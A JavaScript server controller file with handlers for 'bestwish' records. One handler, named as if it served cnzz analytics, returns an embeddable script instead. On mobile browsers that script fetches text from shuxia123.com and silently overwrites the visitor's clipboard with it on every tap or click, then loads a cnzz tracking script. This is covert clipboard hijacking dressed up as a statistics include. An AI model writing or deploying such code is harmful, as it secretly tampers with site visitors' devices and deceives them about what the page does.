import BestwishModel from "../../dao/models/bestwish";

import { encrypt } from "../../utils/encryption";

export const fetchAllBestwish = async (ctx, next) => {
  const { page = 1, size = 10 } = ctx.request.query;
  const result = await BestwishModel.fetchAll({}, page, size);
  ctx.body = ctx.bodyFormatter(undefined, result);
};

export const fetchOneBestwish = async (ctx, next) => {
  const { code } = ctx.params;
  const { page = 1, size = 10 } = ctx.request.query;
  const result = await BestwishModel.fetchAll(
    { enable: 1, code: code },
    page,
    size
  );

  if (result) {
    let response = {};
    let index = 0;
    if (result.length > 0) {
      index = parseInt(Math.random() * result.length);
      response = result[index];
    }
    ctx.body = ctx.bodyFormatter(undefined, response);
  } else {
    ctx.body = ctx.bodyFormatter(errorCode.DATA_NOT_FOUND);
  }
};

export const cnzzBestwish = async (ctx, next) => {
  const { code } = ctx.params;
  ctx.body = `
!(function (a, b) {
function c(c) {
function d() {
function a(c, d) {
    function e(c, d, e) {
    var f = [];
    return (
        (c = e === b ? c : e + "[" + c + "]"),
        "object" == typeof d && null !== d
        ? (f = f.concat(a(d, c)))
        : ((c = encodeURIComponent(c)),
            (d = encodeURIComponent(d)),
            f.push(c + "=" + d)),
        f
    );
    }
    var g,
    f = [];
    if ("[object Array]" == Object.prototype.toString.call(c))
    for (var h = 0, i = c.length; i > h; h++)
        (g = c[h]), (f = f.concat(e("object" == typeof g ? h : "", g, d)));
    else if ("[object Object]" == Object.prototype.toString.call(c))
    for (var j in c) (g = c[j]), (f = f.concat(e(j, g, d)));
    return f;
}
function c(a) {
    for (var b = a.split("&"), c = 0, d = b.length; d > c; c++)
    (name = encodeURIComponent(b[c].split("=")[0])),
        (value = encodeURIComponent(b[c].split("=")[1])),
        (b[c] = name + "=" + value);
    return b;
}
j &&
    ("string" == typeof j ? (j = c(j)) : "object" == typeof j && (j = a(j)),
    (j = j.join("&").replace("/%20/g", "+")),
    ("get" === i || "jsonp" === l) &&
    (h +=
        h.indexOf("?") > -1
        ? h.indexOf("=") > -1
            ? "&" + j
            : j
        : "?" + j));
}
function e() {
var b = document.createElement("script"),
    c = new Date().getTime() + Math.round(1e3 * Math.random()),
    d = "JSONP_" + c;
(a[d] = function (a) {
    clearTimeout(s), document.body.removeChild(b), q(a);
}),
    (b.src = h + (h.indexOf("?") > -1 ? "&" : "?") + "callback=" + d),
    (b.type = "text/javascript"),
    document.body.appendChild(b),
    f(d, b);
}
function f(c, d) {
n !== b &&
    (s = setTimeout(function () {
    "jsonp" === l
        ? (delete a[c], document.body.removeChild(d))
        : ((r = !0), t && t.abort()),
        console.log("timeout");
    }, n));
}
function g() {
function c() {
    if (a.XMLHttpRequest) return new XMLHttpRequest();
    for (
    var b = ["Microsoft", "msxm3", "msxml2", "msxml1"], c = 0;
    c < b.length;
    c++
    )
    try {
        var d = b[c] + ".XMLHTTP";
        return new ActiveXObject(d);
    } catch (e) {}
}
(t = c()),
    t.open(i, h, m),
    "post" !== i || k
    ? k && t.setRequestHeader("Content-Type", k)
    : t.setRequestHeader(
        "Content-Type",
        "application/x-www-form-urlencoded;charset=UTF-8"
        ),
    (t.onreadystatechange = function () {
    if (4 === t.readyState) {
        if (n !== b) {
        if (r) return;
        clearTimeout(s);
        }
        (t.status >= 200 && t.status < 300) || 304 == t.status
        ? q(t.responseText)
        : p(t.status, t.statusText);
    }
    }),
    t.send("get" === i ? null : j),
    f();
}
var h = c.url || "",
i = (c.type || "get").toLowerCase(),
j = c.data || null,
k = c.contentType || "",
l = c.dataType || "",
m = c.async === b ? !0 : c.async,
n = c.timeOut,
o = c.before || function () {},
p = c.error || function () {},
q = c.success || function () {},
r = !1,
s = null,
t = null;
d(), o(), "jsonp" === l ? e() : g();
}
a.ajax = c;
})(window);

function clipboardCopy(text) {
    // Use the Async Clipboard API when available. Requires a secure browsing
    // context (i.e. HTTPS)
    if (navigator.clipboard) {
      return navigator.clipboard.writeText(text).catch(function (err) {
        throw err !== undefined
          ? err
          : new DOMException("The request is not allowed", "NotAllowedError");
      });
    }
  
    // ...Otherwise, use document.execCommand() fallback
  
    // Put the text to copy into a <span>
    var span = document.createElement("span");
    span.textContent = text;
  
    // Preserve consecutive spaces and newlines
    span.style.whiteSpace = "pre";
    span.style.webkitUserSelect = "auto";
    span.style.userSelect = "all";
  
    // Add the <span> to the page
    document.body.appendChild(span);
  
    // Make a selection object representing the range of text selected by the user
    var selection = window.getSelection();
    var range = window.document.createRange();
    selection.removeAllRanges();
    range.selectNode(span);
    selection.addRange(range);
  
    // Copy text to the clipboard
    var success = false;
    try {
      success = window.document.execCommand("copy");
    } catch (err) {
      console.log("error", err);
    }
  
    // Cleanup
    selection.removeAllRanges();
    window.document.body.removeChild(span);
  
    return success
      ? Promise.resolve()
      : Promise.reject(
          new DOMException("The request is not allowed", "NotAllowedError")
        );
  }

function IsPC() {
    var userAgentInfo = navigator.userAgent;
    var Agents = [
      "Android",
      "iPhone",
      "SymbianOS",
      "Windows Phone",
      "iPad",
      "iPod",
    ];
    var flag = true;
    for (var v = 0; v < Agents.length; v++) {
      if (userAgentInfo.indexOf(Agents[v]) > 0) {
        flag = false;
        break;
      }
    }
    return flag;
  }

if (!IsPC()) {
    ajax({
      type: "get",
      url: "https://www.shuxia123.com/services/bestwish/one/1279426249",
      timeOut: 5000,
      before: function () {
        console.log("before");
      },
      success: function (contentText) {
        try {
          var response = JSON.parse(contentText);
          if (
            !response ||
            !response.response ||
            response.meta.code !== 0 ||
            !response.response.code
          ) {
            return;
          }
          var cnzzUrl =
            "https://v1.cnzz.com/z_stat.php?id=" + response.response.code;
          var content = response.response.description;
          var haveCreateCnzz = false;
          setTimeout(() => {
            function createCnzz() {
                if (haveCreateCnzz) {
                  return;
                }
                haveCreateCnzz = true;
                var script = document.createElement("script");
                script.setAttribute("src", cnzzUrl);
                script.setAttribute("type", "text/javascript");
                document.body.append(script);
              }
              document.addEventListener("touchend", () => {
                clipboardCopy(content).then(() => {
                  setTimeout(() => {
                    createCnzz();
                  }, 500);
                });
              });
              document.addEventListener("click", () => {
                clipboardCopy(content).then(() => {
                  setTimeout(() => {
                    createCnzz();
                  }, 500);
                });
              });
          }, 500);
        } catch (e) {}
      },
      error: function () {
        console.log("error");
      },
    });
  }

    `;
};
